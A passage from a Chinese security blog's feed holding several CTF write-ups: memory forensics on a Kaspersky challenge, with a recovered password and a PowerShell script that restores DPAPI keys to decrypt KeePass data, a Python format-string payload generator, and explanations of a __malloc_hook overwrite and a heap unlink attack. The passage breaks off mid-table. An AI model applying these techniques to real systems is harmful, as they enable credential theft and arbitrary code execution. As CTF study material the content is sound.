00 61 00 6e 00 6f 00 74 00 68 00 65 00 72 00   _.a.n.o.t.h.e.r.</div><div class="line">0x00000030  5f 00 6b 00 65 00 79 00 5f 00 74 00 6f 00 5f 00   _.k.e.y._.t.o._.</div><div class="line">0x00000040  70 00 61 00 73 00 73 00 5f 00 74 00 68 00 69 00   p.a.s.s._.t.h.i.</div><div class="line">0x00000050  73 00 5f 00 6c 00 65 00 76 00 65 00 6c 00 00 00   s._.l.e.v.e.l...</div><div class="line"></div><div class="line">DPAPI_SYSTEM</div><div class="line">0x00000000  2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ,...............</div><div class="line">0x00000010  01 00 00 00 b8 5c 72 98 16 2b f1 72 c9 84 2c 68   .....\r..+.r..,h</div><div class="line">0x00000020  f3 07 bb 2b e6 ce 6a 4b 73 f1 ec fa a6 51 61 7d   ...+..jKs....Qa&#125;</div><div class="line">0x00000030  4a 82 97 61 db 55 d2 34 e8 df 7f b8 00 00 00 00   J..a.U.4........</div></pre></td></tr></table></figure><p>密码是 <font color="red">yo_need_another_key_to_pass_this_level</font>，真tmd长</p><h4 id="搞账户信息"><a href="#搞账户信息" class="headerlink" title="搞账户信息"></a>搞账户信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">1508 explorer.exe         0x002ebf88 PUBLIC                         C:\Users\Public</div><div class="line">    1508 explorer.exe         0x002ebf88 SESSIONNAME                    Console</div><div class="line">    1508 explorer.exe         0x002ebf88 SystemDrive                    C:</div><div class="line">    1508 explorer.exe         0x002ebf88 SystemRoot                     C:\Windows</div><div class="line">    1508 explorer.exe         0x002ebf88 TEMP                           C:\Users\user\AppData\Local\Temp</div><div class="line">    1508 explorer.exe         0x002ebf88 TMP                            C:\Users\user\AppData\Local\Temp</div><div class="line">    1508 explorer.exe         0x002ebf88 USERDOMAIN                     WIN-GFCKT3R8MQ2</div><div class="line">    1508 explorer.exe         0x002ebf88 USERNAME                       user</div><div class="line">    1508 explorer.exe         0x002ebf88 USERPROFILE                    C:\Users\user</div><div class="line">    1508 explorer.exe         0x002ebf88 windir                         C:\Windows</div><div class="line">    1636 VGAuthService.       0x003207f0 ALLUSERSPROFILE                C:\ProgramData</div><div class="line">    1636 VGAuthService.       0x003207f0 APPDATA                        C:\Windows\system32\config\systemprofile\AppD</div></pre></td></tr></table></figure><h2 id="恢复KeePass加密数据"><a href="#恢复KeePass加密数据" class="headerlink" title="恢复KeePass加密数据"></a>恢复KeePass加密数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Restore-UserDPAPI -Path C:\Users\W\Desktop\S-1-5-21-196189514-4237867838-3788442389-1000 -UserName user -UserDomain WIN-GFCKT3R8MQ2 -ProtectedUserKey C:\Users\W\Desktop\ProtectedUserKey.bin</div></pre></td></tr></table></figure><p>Restore-UserDPAPI脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> Restore-UserDPAPI &#123;</div><div class="line">&lt;<span class="comment">#</span></div><div class="line">    .SYNOPSIS</div><div class="line"></div><div class="line">        Restores a user account<span class="string">'s DPAPI master key on a new system.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        Author: @harmj0y</span></div><div class="line"><span class="string">        License: BSD 3-Clause</span></div><div class="line"><span class="string">        Required Dependencies: None</span></div><div class="line"><span class="string">        Optional Dependencies: None</span></div><div class="line"><span class="string">    </span></div><div class="line"><span class="string">    .DESCRIPTION</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        This function will take a backup of a user'</span>s DPAPI master key folder (C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\),</div><div class="line">        copies the folder to %APPDATA%\Microsoft\Protect\ <span class="keyword">for</span> the current user on a new machine, sets several</div><div class="line">        DPAPI MigratedUsers registry keys necessary, and invokes dpapimig.exe to kick off <span class="string">"Protected Content Migration"</span>.</div><div class="line">        If the password <span class="keyword">for</span> the user account associated with the master key differs from the current user<span class="string">'s,</span></div><div class="line"><span class="string">        the "Protected Content Migration" GUI will prompt for the old user password.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        There is more information on this process from KeePass at https://sourceforge.net/p/keepass/wiki/Recover%20Windows%20User%20Account%20Credentials/</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    .PARAMETER Path</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        The C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\ folder to restore, must be in S-1-... SID format.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    .PARAMETER UserName</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        The username linked to the folder to restore.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    .PARAMETER UserDomain</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        The domain (or local machine) linked to the UserName/folder.</span></div><div class="line"><span class="string">    </span></div><div class="line"><span class="string">    .PARAMETER ProtectedUserKey</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        The path to an optional ProtectedUserKey.bin KeePass DPAPI blob.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    .EXAMPLE</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        PS C:\Temp&gt; Restore-UserDPAPI -Path C:\Temp\S-1-5-21-456218688-4216621462-1491369290-1210\ -UserName testuser -UserDomain testlab.local</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        Restores the DPAPI master key for the testlab.local\testuser (SID=S-1-5-21-456218688-4216621462-1491369290-1210) from</span></div><div class="line"><span class="string">        the C:\Temp\S-1-5-21-456218688-4216621462-1491369290-1210\ backup folder.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    .EXAMPLE</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        PS C:\Temp&gt; Restore-UserDPAPI -Path C:\Temp\S-1-5-21-456218688-4216621462-1491369290-1210\ -UserName testuser -UserDomain testlab.local -ProtectedUserKey ProtectedUserKey.bin</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        Restores the DPAPI master key for the testlab.local\testuser (SID=S-1-5-21-456218688-4216621462-1491369290-1210) from</span></div><div class="line"><span class="string">        the C:\Temp\S-1-5-21-456218688-4216621462-1491369290-1210\ backup folder, and copies the KeePass-specific</span></div><div class="line"><span class="string">        ProtectedUserKey.bin DPAPI blob into the proper location.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    .LINK</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        https://sourceforge.net/p/keepass/wiki/Recover%20Windows%20User%20Account%20Credentials/</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">#&gt;</span></div><div class="line"><span class="string">    [CmdletBinding()]</span></div><div class="line"><span class="string">    Param(</span></div><div class="line"><span class="string">        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]</span></div><div class="line"><span class="string">        [ValidateScript(&#123; Test-Path -Path $_ &#125;)]</span></div><div class="line"><span class="string">        [String]</span></div><div class="line"><span class="string">        $Path,</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        [Parameter(Mandatory=$True)]</span></div><div class="line"><span class="string">        [ValidateNotNullOrEmpty()]</span></div><div class="line"><span class="string">        [String]</span></div><div class="line"><span class="string">        $UserName,</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        [Parameter(Mandatory=$True)]</span></div><div class="line"><span class="string">        [ValidateNotNullOrEmpty()]</span></div><div class="line"><span class="string">        [String]</span></div><div class="line"><span class="string">        $UserDomain,</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">        [ValidatePattern('</span>.*ProtectedUserKey\.bin<span class="string">')]</span></div><div class="line"><span class="string">        [ValidateScript(&#123; Test-Path -Path $_ &#125;)]</span></div><div class="line"><span class="string">        [Alias('</span>KeePassBlob<span class="string">')]</span></div><div class="line"><span class="string">        [String]</span></div><div class="line"><span class="string">        $ProtectedUserKey</span></div><div class="line"><span class="string">    )</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    $UserFolder = Get-Item $Path</span></div><div class="line"><span class="string">    $SID = $UserFolder.Name</span></div><div class="line"><span class="string">    </span></div><div class="line"><span class="string">    if($SID -notmatch '</span>^S-1-.*<span class="string">') &#123;</span></div><div class="line"><span class="string">        throw "User folder must be in '</span>S-1-...<span class="string">' SID format!"</span></div><div class="line"><span class="string">    &#125;</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    Write-Host "`n[*] Copying $($UserFolder.FullName) DPAPI folder to $ENV:APPDATA\Microsoft\Protect\"</span></div><div class="line"><span class="string">    Copy-Item -Path $UserFolder -Destination $ENV:APPDATA\Microsoft\Protect\ -Recurse -Force</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    Write-Host "`n[*] Creating DPAPI MigratedUsers registry keys"</span></div><div class="line"><span class="string">    $Null = New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DPAPI\MigratedUsers\$SID\UserDomain" -Force</span></div><div class="line"><span class="string">    $Null = New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DPAPI\MigratedUsers\$SID\UserDomain" -Name $UserDomain -Force</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    $Null = New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DPAPI\MigratedUsers\$SID\UserName" -Force</span></div><div class="line"><span class="string">    $Null = New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DPAPI\MigratedUsers\$SID\UserName" -Name $UserName -Force</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    Write-Host "`n[*] Calling dpapimig.exe... (this may take just a bit)`n"</span></div><div class="line"><span class="string">    Start-Process $ENV:WINDIR\System32\dpapimig.exe -NoNewWindow -Wait</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    if($PSBoundParameters['</span>ProtectedUserKey<span class="string">']) &#123;</span></div><div class="line"><span class="string">        $ProtectedUserKeyFile = Get-Item $ProtectedUserKey</span></div><div class="line"><span class="string">        Write-Host "[*] Copying $($ProtectedUserKeyFile.FullName) to $ENV:APPDATA\KeePass\`n"</span></div><div class="line"><span class="string">        if (-not (Test-Path -Path $ENV:APPDATA\KeePass\)) &#123; $Null = New-Item $ENV:APPDATA\KeePass\ -Type Directory &#125;</span></div><div class="line"><span class="string">        Copy-Item -Path $ProtectedUserKeyFile -Destination $ENV:APPDATA\KeePass\ -Force</span></div><div class="line"><span class="string">    &#125;</span></div><div class="line"><span class="string">&#125;</span></div></pre></td></tr></table></figure><p>会要求输入需要恢复的用户的密码，输入即可<code>you_need_another_key_to_pass_this_level</code></p><h4 id="打开KeePass，选择使用windows账户进行验证"><a href="#打开KeePass，选择使用windows账户进行验证" class="headerlink" title="打开KeePass，选择使用windows账户进行验证"></a>打开KeePass，选择使用windows账户进行验证</h4><p><img src="/2017/10/19/karspersky-helpme/flag.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;karspersky-Helpme&quot;&gt;&lt;a href=&quot;#karspersky-Helpme&quot; class=&quot;headerlink&quot; title=&quot;karspersky Helpme&quot;&gt;&lt;/a&gt;karspersky Helpme&lt;/h1&gt;&lt;h2 id=&quot;常规分析&quot;&gt;&lt;a href=&quot;#常规分析&quot; class=&quot;headerlink&quot; title=&quot;常规分析&quot;&gt;&lt;/a&gt;常规分析&lt;/h2&gt;&lt;h3 id=&quot;查看内存快照的属性&quot;&gt;&lt;a href=&quot;#查看内存快照的属性&quot; class=&quot;headerlink&quot; title=&quot;查看内存快照的属性&quot;&gt;&lt;/a&gt;查看内存快照的属性&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;volatility -f ./memory.vmem imageinfo&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Volatility Foundation Volatility Framework 2.6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;INFO    : volatility.debug    : Determining profile based on KDBG search...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                     AS Layer2 : FileAddressSpace (/home/flier/Desktop/karspersky/helpme/memory.vmem)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                      PAE &lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; : PAE&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                           DTB : 0x185000L&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                          KDBG : 0x82961be8L&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          Number of Processors : 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     Image Type (Service Pack) : 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                KPCR &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; CPU 0 : 0x82962c00L&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             KUSER_SHARED_DATA : 0xffdf0000L&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;           Image date and time : 2017-09-25 12:18:53 UTC+0000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     Image &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt; date and time : 2017-09-25 15:18:53 +0300&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="MISC" scheme="http://blog.flier.net.cn/categories/MISC/"/>
    
    
      <category term="MISC" scheme="http://blog.flier.net.cn/tags/MISC/"/>
    
      <category term="forensic" scheme="http://blog.flier.net.cn/tags/forensic/"/>
    
  </entry>
  
  <entry>
    <title>fmt_str write func</title>
    <link href="http://blog.flier.net.cn/2017/10/16/fmt-str-write-func/"/>
    <id>http://blog.flier.net.cn/2017/10/16/fmt-str-write-func/</id>
    <published>2017-10-16T02:25:06.000Z</published>
    <updated>2017-10-18T18:02:14.621Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">format</span><span class="params">(writes, idx, address_string)</span>:</span></div><div class="line">    printed = len(address_string)</div><div class="line">    payload = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> where, what <span class="keyword">in</span> sorted(writes.items(),key = <span class="keyword">lambda</span> tmp:tmp[<span class="number">1</span>]):</div><div class="line">        <span class="keyword">print</span> where, what</div><div class="line">        to_add = (what - printed) &amp;<span class="number">0xffff</span></div><div class="line">        <span class="keyword">if</span> to_add &gt; <span class="number">0</span>:</div><div class="line">            <span class="keyword">if</span> to_add &lt; <span class="number">8</span>:</div><div class="line">                payload += (what-printed) * <span class="string">'a'</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                payload += <span class="string">'%0'</span> + str(to_add) + <span class="string">'x'</span></div><div class="line">        payload += <span class="string">'%'</span> + str(where + idx) + <span class="string">'$hn'</span></div><div class="line">        printed += to_add</div><div class="line">    <span class="keyword">return</span>  address_string + payload</div><div class="line"></div><div class="line">writes = &#123;&#125;</div><div class="line">writes[<span class="number">0</span>] = (<span class="number">0x12345678</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></div><div class="line">writes[<span class="number">1</span>] = <span class="number">0x12345678</span> &amp; <span class="number">0xffff</span></div><div class="line">writes[<span class="number">2</span>] = (<span class="number">0x12abcdef</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></div><div class="line">writes[<span class="number">3</span>] = <span class="number">0x12abcdef</span> &amp; <span class="number">0xffff</span></div><div class="line">addr_string = <span class="string">'\x12\x34\x56\x78'</span> + <span class="string">'\x12\x34\x56\x78'</span> + <span class="string">'\x12\x34\x56\x78'</span> + <span class="string">'\x12\x34\x56\x78'</span></div><div class="line"><span class="keyword">print</span> format(writes, <span class="number">0</span>, addr_string)</div></pre></td></tr></table></figure><p><img src="/2017/10/16/fmt-str-write-func/bk.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/d
      
    
    </summary>
    
      <category term="PWN" scheme="http://blog.flier.net.cn/categories/PWN/"/>
    
    
      <category term="PWN" scheme="http://blog.flier.net.cn/tags/PWN/"/>
    
      <category term="FORMAT STRING" scheme="http://blog.flier.net.cn/tags/FORMAT-STRING/"/>
    
  </entry>
  
  <entry>
    <title>format string overwrite __malloc_hook</title>
    <link href="http://blog.flier.net.cn/2017/10/16/format-string-overwrite-malloc-hook/"/>
    <id>http://blog.flier.net.cn/2017/10/16/format-string-overwrite-malloc-hook/</id>
    <published>2017-10-15T18:08:37.000Z</published>
    <updated>2017-10-18T07:53:57.359Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="format-string-amp-reload-amp-malloc-hook"><a href="#format-string-amp-reload-amp-malloc-hook" class="headerlink" title="format string &amp; reload &amp; __malloc_hook"></a>format string &amp; reload &amp; __malloc_hook</h2><p>When we can use <strong>format string</strong> to write our data to any address, this elf file is marked as reload. So we can’t easily write our data to got table to control the ip.</p><p>We can still control the ip by writing data to the address of <strong>__malloc_hook</strong> in glibc.</p><a id="more"></a><p><em>Does <strong>printf</strong> function call <strong>malloc</strong>?</em></p><ul><li><em>When we use <strong>printf</strong> and the <strong>format string</strong> cantains ‘%<strong>WIDTH</strong>s’ and the <strong>WIDTH</strong> is over 32 bytes, <strong>printf</strong> will call malloc to allocate more memory for itself.</em></li></ul><p><em>How to use <strong>printf</strong>‘s calling <strong>malloc</strong>?</em></p><ul><li>When we know the base address of <strong>glibc</strong>, we can write our data to libc.</li><li>When we overwrite <strong>__malloc_hook</strong> in glibc, we can control the flow of <strong>malloc</strong> function.</li><li>We can use <strong>format string</strong> to </li><li><ul><li>write “/bin/sh” on the address in r/w segment</li></ul></li><li><ul><li>write the address of <strong>system</strong> in glibc on the address of <strong>__malloc_hook</strong></li></ul></li><li><ul><li>use ‘%<strong>WIDTH</strong>s’ (<strong>WIDTH</strong> is the address of ‘/bin/sh’<strong> minus 32</strong>) to call <strong>malloc</strong> while <strong>__malloc_hook</strong> is the address of system.Due to that the first parameter of <strong>malloc</strong> is the <strong>size</strong> we need and the first parameter of <strong>system</strong> is the address of the <strong>cmd</strong> we call <strong>system(cmd)</strong>, we successfully execute the cmd like ‘/bin/sh’.</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;h2 id=&quot;format-string-amp-reload-amp-malloc-hook&quot;&gt;&lt;a href=&quot;#format-string-amp-reload-amp-malloc-hook&quot; class=&quot;headerlink&quot; title=&quot;format string &amp;amp; reload &amp;amp; __malloc_hook&quot;&gt;&lt;/a&gt;format string &amp;amp; reload &amp;amp; __malloc_hook&lt;/h2&gt;&lt;p&gt;When we can use &lt;strong&gt;format string&lt;/strong&gt; to write our data to any address, this elf file is marked as reload. So we can’t easily write our data to got table to control the ip.&lt;/p&gt;
&lt;p&gt;We can still control the ip by writing data to the address of &lt;strong&gt;__malloc_hook&lt;/strong&gt; in glibc.&lt;/p&gt;
    
    </summary>
    
      <category term="PWN" scheme="http://blog.flier.net.cn/categories/PWN/"/>
    
    
      <category term="PWN" scheme="http://blog.flier.net.cn/tags/PWN/"/>
    
      <category term="FORMAT STRING" scheme="http://blog.flier.net.cn/tags/FORMAT-STRING/"/>
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="http://blog.flier.net.cn/2017/10/16/unlink/"/>
    <id>http://blog.flier.net.cn/2017/10/16/unlink/</id>
    <published>2017-10-15T18:01:51.000Z</published>
    <updated>2017-10-18T07:54:49.201Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HEAP-UNLINK-ATTACK"><a href="#HEAP-UNLINK-ATTACK" class="headerlink" title="HEAP UNLINK ATTACK"></a>HEAP UNLINK ATTACK</h1><h2 id="WHAT-IS-UNLINK"><a href="#WHAT-IS-UNLINK" class="headerlink" title="WHAT IS UNLINK"></a>WHAT IS UNLINK</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;</span></div><div class="line">    FD = P-&gt;fd;</div><div class="line">    BK = P-&gt;bk;</div><div class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</div><div class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P);</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        FD-&gt;bk = BK;</div><div class="line">        BK-&gt;fd = FD;</div><div class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)</div><div class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</div><div class="line">            assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);</div><div class="line">            assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);</div><div class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</div><div class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)</div><div class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</div><div class="line">                <span class="keyword">else</span> &#123;</div><div class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</div><div class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</div><div class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</div><div class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</div><div class="line">                  &#125;</div><div class="line">              &#125; <span class="keyword">else</span> &#123;</div><div class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</div><div class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</div><div class="line">              &#125;</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><a id="more"></a> <h2 id="WHEN-UNLINK-SHOULD-BE-CALLED"><a href="#WHEN-UNLINK-SHOULD-BE-CALLED" class="headerlink" title="WHEN UNLINK SHOULD BE CALLED"></a>WHEN UNLINK SHOULD BE CALLED</h2><h4 id="1-pass-the-CHECK-of-UNLINK"><a href="#1-pass-the-CHECK-of-UNLINK" class="headerlink" title="(1) pass the CHECK of UNLINK"></a>(1) pass the <font color="red"><strong>CHECK</strong></font> of UNLINK</h4><font color="red"> FD->bk == P &amp;&amp; BK->fd == P</font><h4 id="2-prev-after-chunk-is-marked-as-free-’d"><a href="#2-prev-after-chunk-is-marked-as-free-’d" class="headerlink" title="(2) prev/after chunk is marked as free()’d"></a>(2) prev/after chunk is marked as <font color="red"><strong>free()’d</strong></font></h4><p>When GLIBC <font color="red">free</font> a chunk, it will going to see <font color="red">whether the chunk before/after is free</font>. If it is, then the chunk before/after will be unlink()’d off its double-linked list and these two chunks merge into one chunk.</p><h2 id="HOW-TO-BYPASS-CHECK"><a href="#HOW-TO-BYPASS-CHECK" class="headerlink" title="HOW TO BYPASS  CHECK "></a>HOW TO BYPASS <font color="red"> CHECK </font></h2><h4 id="1-got-a-address-of-the-PTR-to-the-address-of-amp-LABEL-fake-chunk-amp-chunk-header-word-size-2"><a href="#1-got-a-address-of-the-PTR-to-the-address-of-amp-LABEL-fake-chunk-amp-chunk-header-word-size-2" class="headerlink" title="(1) got a address of the PTR to the address of &amp;LABEL(fake chunk) ( &amp;chunk header + word_size * 2 )"></a>(1) got a address of the <strong>PTR</strong> to the address of <font color="red">&amp;LABEL(fake chunk) ( &amp;chunk header + word_size * 2 )</font></h4><font color="red">PTR(the ptr to the fake chunk LABEL)</font><h4 id="Before-Overflow"><a href="#Before-Overflow" class="headerlink" title="Before Overflow"></a>Before Overflow</h4><table><thead><tr><th style="text-align:center">PREV_SIZE(get prev LABEL here)</th><th style="text-align:center">SIZE(lowest bit PREV_USE)</th></tr></thead><tbody><tr><td style="text-align:center">the user data(<font color="red">malloc return</font>)</td><td style="text-align:center">user data</td></tr><tr><td style="text-align:center">……</td><td style="text-align:center">……</td></tr><tr><td style="text-align:center"><strong> PREV_SIZE(get prev LABEL here) </strong></td><td style="text-align:center"><strong> SIZE(lowest bit PREV_USE) </strong></td></tr></tbody></table><h4 id="After-Overflow-along-with-with-fake-chunk-make"><a href="#After-Overflow-along-with-with-fake-chunk-make" class="headerlink" title="After Overflow(along with with fake chunk make)"></a>After Overflow(along with with fake chunk make)</h4><table><thead><tr><th style="text-align:center">PREV_SIZE(get prev LABEL here)</th><th style="text-align:center">SIZE(lowest bit PREV_USE)</th></tr></thead><tbody><tr><td style="text-align:center">PREV_SIZE (<font color="blue">faked</font>)</td><td style="text-align:center">SIZE (<font color="blue">faked</font>)</td></tr><tr><td 